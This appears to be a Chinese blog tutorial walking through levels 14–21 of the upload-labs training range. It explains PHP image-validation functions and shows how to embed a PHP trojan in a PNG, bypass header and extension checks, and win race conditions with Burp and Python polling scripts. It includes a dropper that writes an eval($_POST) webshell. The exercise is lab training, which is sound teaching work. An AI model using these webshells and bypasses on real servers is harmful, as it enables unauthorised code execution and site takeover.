# 原创
：  web安全-文件上传漏洞-图片马制作-相关php函数讲解-upload靶场通关详细教学（3）

# web安全-文件上传漏洞-图片马制作-相关php函数讲解-upload靶场通关详细教学（3）

### &lt;制作图片马&gt;

制作图片马有两种方法，一种是文本方式打开，末尾粘贴一句话木马，令一种是使用命令进行合成。

首先准备好一个图片（这里是1.png）。

将一个图片以文本格式打开（这里用的Notepad++，以记事本方式打开修改也能连接成功，不过修改后图片无法正常显示了）。

后面粘贴上一句话木马。

图片依然可以正常打开。

首先准备好一个图片（这里是1.png）。

再准备好一个一句话木马（这里是2.php）。

打开命令提示符，首先进入上面两个文件存放的路径。

```
cd C:\Users\WYR\Desktop
```

使用下面的命令进行图片马合成。

```
copy 1.png/b + 2.php/a 3.png
```

图片依然可以正常打开。

### &lt;Pass-14&gt;

```
提示：
本pass检查图标内容开头2个字节！

原码：
function getReailFileType($filename){
    $file = fopen($filename, "rb");
    $bin = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo = @unpack("C2chars", $bin);    
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
    $fileType = '';    
    switch($typeCode){      
        case 255216:            
            $fileType = 'jpg';
            break;
        case 13780:            
            $fileType = 'png';
            break;        
        case 7173:            
            $fileType = 'gif';
            break;
        default:            
            $fileType = 'unknown';
        }    
        return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_type = getReailFileType($temp_file);

    if($file_type == 'unknown'){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

分析源码可知此源代码是验证前缀（文件头信息）。

首先将上面创建的图片马进行上传。

上传成功。

右键点击图片复制图片路径。

点击“文件包含漏洞”进入测试网页运行图片马中的恶意代码进行测试。

在测试网页内的网址后添加上传的文件马的路径，然后回车运行。

上半部分是图片内容，下半部分是一句话木马返回的内容。

### &lt;Pass-15&gt;+getimagesize()函数

```
提示：
本pass使用getimagesize()检查是否为图片文件！

原码：
function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)&gt;=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

分析源码可知存在如下语句进行验证。

```
$info = getimagesize($filename);
```

此语句就是一个检测，如果上传的文件是php格式就得不到图片的尺寸，就会返回错误，后面的代码就无法执行，文件就没办法成功上传。

此关同&lt;Pass-14&gt;通关方法一样，均是将图片马上传之后，结合文件包含漏洞进行绕过，进入测试网页进行测试后，均可执行php后门代码。

---


知识补充：

getimagesize()函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。

```
语法格式：
array getimagesize ( string $filename [, array &amp;$imageinfo ] )
```

getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。

---


### &lt;Pass-16&gt;+exif_imagetype()函数

```
提示：
本pass使用exif_imagetype()检查是否为图片文件！

原码：
function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return "gif";
            break;
        case IMAGETYPE_JPEG:
            return "jpg";
            break;
        case IMAGETYPE_PNG:
            return "png";
            break;    
        default:
            return false;
            break;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

分析源码可知存在如下语句进行验证。

```
$image_type = exif_imagetype($filename);
```

此语句就是一个检测，如果上传的文件是php格式不是图片，就会返回错误，后面的代码就无法执行，文件就没办法成功上传。

此关同&lt;Pass-14&gt;通关方法一样，均是将图片马上传之后，结合文件包含漏洞进行绕过，进入测试网页进行测试后，均可执行php后门代码。

---


知识补充：

exif_imagetype()函数是PHP中的内置函数，用于确定图像的类型。

```
语法格式：
intexif_imagetype( string $filename )
```

该函数接受单个参数$filename，该参数保存图像的名称或URL。

---


### &lt;Pass-17&gt;+imagecreatefrom 系列函数

```
提示：
本pass重新渲染了图片！

原码：
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") &amp;&amp; ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") &amp;&amp; ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "该文件不是png格式的图片！";
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".png";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "gif") &amp;&amp; ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "该文件不是gif格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".gif";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}
```

分析源码可知存在如下语句进行验证。

```
$im = imagecreatefromjpeg($target_path);
$im = imagecreatefrompng($target_path);
$im = imagecreatefromgif($target_path);
```

此关同&lt;Pass-14&gt;通关方法一样，均是将图片马上传之后，结合文件包含漏洞进行绕过，进入测试网页进行测试后，均可执行php后门代码。

---


知识补充：

imagecreatefrom 系列函数用于从文件或 URL 载入一幅图像，成功返回图像资源，失败则返回一个空字符串。

该系列函数有：

imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像

imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像

imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像

imagecreatefromwbmp()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像

imagecreatefromstring()：创建一块画布，并从字符串中的图像流新建一副图像

```
语法格式：
resource imagecreatefromgif(string filename)
resource imagecreatefromjpeg(string filename)
resource imagecreatefrompng(string filename)
resource imagecreatefromwbmp(string filename)
resource imagecreatefromstring(string image)
```

---


###  &lt;Pass-18&gt;+move_uploaded_file()函数

```
提示：
需要代码审计！

原码：
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}
```

此关涉及到了二次渲染的知识，比如我们平时在进行文件上传时，在我们上传文件后，网站会对图片进行二次处理（格式、尺寸、保存、删除要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片（标准化）并放到网站对应的标签进行显示。

而二次渲染可能会存在逻辑漏洞，就是它验证的地方是在第一步还是在第二步。

还涉及到条件竞争的知识，我们在日常生活里使用电脑可以发现，如果文件正在被使用或者查看，就无法对文件进行删除或者文件名修改等操作。

此关先创建了一个只包含图片文件的白名单，随后提取出文件的后缀名，将文件移动至上传目录后才判断文件是否合法，不合法就删除。

因此可以利用这两点，不停且迅速地上传、访问文件（可以使用使用BURP和Python脚本来实现），网站的代码就不能完成对上传文件的名称的修改，可以利用这一点防止php后缀被更改导致php代码不能正常运行。

操作流程：

```
Python脚本（可用可不用，可以手动进行）：
import requests
url="http://127.0.0.1/upload-labs/upload/shell.php"
while True:
    web_result=requests.get(url)
    if web_result.status_code == 200:
        print("Success")
        break
    else:
        print("Failed")
```

```
2.php内容：
&lt;?php phpinfo();?&gt;
```

上传一句话木马文件后使用BURP抓包，右键数据包后，点击“Send to Intruder”发送至“Intruder”（或者使用键盘的Ctrl+I键）。

点击“Intruder”后点击“Positions”，然后点击“Clear”。

点击“Payloads”后，设置“Payload type”为“Null payloads”，设置“Payload Options”为“Continue indefinitely”。

进行完上面设置后，点击“Start attack”来开始不断上传该文件。

此时如果查看“upload”目录可以看到一句话木马文件会不断出现、消失、出现、消失...

然后可以选择运行脚本来不断访问该文件，也可以打开另一个浏览器输入文件路径后手动对文件进行访问。

这里展示手动访问，不断刷新网页后到某一时刻可以成功得到一句话木马执行后返回的页面。

---


知识补充：

move_uploaded_file() 函数把上传的文件移动到新位置。

如果成功该函数返回 TRUE，如果失败则返回 FALSE。

```
语法格式：
move_uploaded_file(file,newloc)
```
|参数|描述

描述
|file|必需。规定要移动的文件。

必需。规定要移动的文件。
|newloc|必需。规定文件的新位置。

必需。规定文件的新位置。

提示和注释：

注释1：该函数仅用于通过 HTTP POST 上传的文件。

注释2：如果目标文件已经存在，将会被覆盖。

---


### &lt;Pass-19&gt;

```
提示：
需要代码审计！

原码：
//index.php
$is_upload = false;
$msg = null;
if (isset($_POST['submit']))
{
    require_once("./myupload.php");
    $imgFileName =time();
    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u-&gt;upload(UPLOAD_PATH);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;
            break;
        case 2:
            $msg = '文件已经被上传，但没有重命名。';
            break; 
        case -1:
            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
            break; 
        case -2:
            $msg = '上传失败，上传目录不可写。';
            break; 
        case -3:
            $msg = '上传失败，无法上传该类型文件。';
            break; 
        case -4:
            $msg = '上传失败，上传的文件过大。';
            break; 
        case -5:
            $msg = '上传失败，服务器已经存在相同名称文件。';
            break; 
        case -6:
            $msg = '文件无法上传，文件不能复制到目标目录。';
            break;      
        default:
            $msg = '未知错误！';
            break;
    }
}

//myupload.php
class MyUpload{
......
......
...... 
  var $cls_arr_ext_accepted = array(
      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
      ".html", ".xml", ".tiff", ".jpeg", ".png" );

......
......
......  
  /** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/
  function upload( $dir ){
    
    $ret = $this-&gt;isUploadedFile();
    
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );
    }

    $ret = $this-&gt;setDir( $dir );
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );
    }

    $ret = $this-&gt;checkExtension();
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );
    }

    $ret = $this-&gt;checkSize();
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );    
    }
    
    // if flag to check if the file exists is set to 1
    
    if( $this-&gt;cls_file_exists == 1 ){
      
      $ret = $this-&gt;checkFileExists();
      if( $ret != 1 ){
        return $this-&gt;resultUpload( $ret );    
      }
    }

    // if we are here, we are ready to move the file to destination

    $ret = $this-&gt;move();
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );    
    }

    // check if we need to rename the file

    if( $this-&gt;cls_rename_file == 1 ){
      $ret = $this-&gt;renameFile();
      if( $ret != 1 ){
        return $this-&gt;resultUpload( $ret );    
      }
    }
    
    // if we are here, everything worked as planned :)

    return $this-&gt;resultUpload( "SUCCESS" );
  
  }
......
......
...... 
};
```

此关和前一关非常类似，但是Pass-19进行了一个文件名过滤，因此php后缀文件就无法上传了，只能上传图片马，然后结合“文件包含漏洞”进行绕过。

上传文件后，进行白名单检测，移动文件，然后进行重命名。

将文件上传后，对文件重新命名时，同样存在条件竞争的漏洞。可以利用&lt;Pass-18&gt;类似方法进行绕过，但是此时访问的地址就是文件包含的那个地址了。

操作流程：

```
Python脚本（可用可不用，可以手动进行）：
import requests
url = "http://127.0.0.1/upload-labs/include.php?file=upload/pass19.png"
while True:
    html = requests.get(url)
    if ( 'Warning'  not in  str(html.text)):
        print('ok')
        break
```

```
2.php内容：
&lt;?php phpinfo();?&gt;

补充：
&lt;?php fputs(fopen('Muma.php','w'),'&lt;?php @eval($_POST["Muma"])?&gt;');?&gt;
```

此关文件上传的路径与前面挂卡的路径不一样，在网站的根目录，为了更加方便，将文件路径仍然改到“upload”下。

上传一句话木马文件后使用BURP抓包，右键数据包后，点击“Send to Intruder”发送至“Intruder”（或者使用键盘的Ctrl+I键）。

点击“Intruder”后点击“Positions”，然后点击“Clear”。

点击“Payloads”后，设置“Payload type”为“Null payloads”，设置“Payload Options”为“Continue indefinitely”。

进行完上面设置后，点击“Start attack”来开始不断上传该文件。

然后可以选择运行脚本来不断访问该文件，也可以打开另一个浏览器输入文件路径后手动对文件进行访问。

这里展示手动访问，不断刷新网页后到某一时刻可以成功得到一句话木马执行后返回的页面，上半部分是图片内容，下半部分是一句话木马执行后返回的内容。

### &lt;Pass-20&gt;

```
提示：
本pass的取文件名通过$_POST来获取。

原码：
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = $_POST['save_name'];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = '上传出错！';
            }
        }else{
            $msg = '禁止保存为该类型文件！';
        }

    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

此关只对保存的文件后缀进行了黑名单检测，未对上传的文件类型做什么判断，其它防护全部没做。所以我们可以有多种方法进行绕过，这里将一种方法。

分析原码可以看出这些黑名单都是小写的形式，也就是说我们完全可以上传一个一句话木马然后将其”保存名称”修改为“.PHP”（改为“.php/.”也可以）后缀即可绕过。

点击上传后发现成功进行了绕过。

访问发现代码可以正常执行。

### &lt;Pass-21&gt;

```
提示：
Pass-20来源于CTF，请审计代码！

原码：
$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}
```

此关存在多重验证。

首先进行白名单验证MIME类型。

然后判断save_name参数是否为空，如果为空就把文件本来的名称赋值给“$file”,如果不为空就将“save_name”参数的值赋给它。

接下来判断“$file”是否是数组。

如果不是数组则将其拆分成数组，然后使用“end（）函数”取出数组最后一个的值，取出后同白名单做比较，如果与“$allow_suffix”中的后缀匹配，就允许继续上传。

之后代码会将数组的值拼接在一起对文件进行重命名。

操作流程：

首先选中要上传的一句话木马文件“2.jpg”。

点击上传使用BURP抓包。

将数据包修改为如下样式。

点击放包后可以在网页内看到文件成功上传了。

访问文件地址可以看到一句话木马成功执行了。

---


至此upload-labs靶场全部关卡通关教程已结束

其它关卡可以参照前两篇文章

---

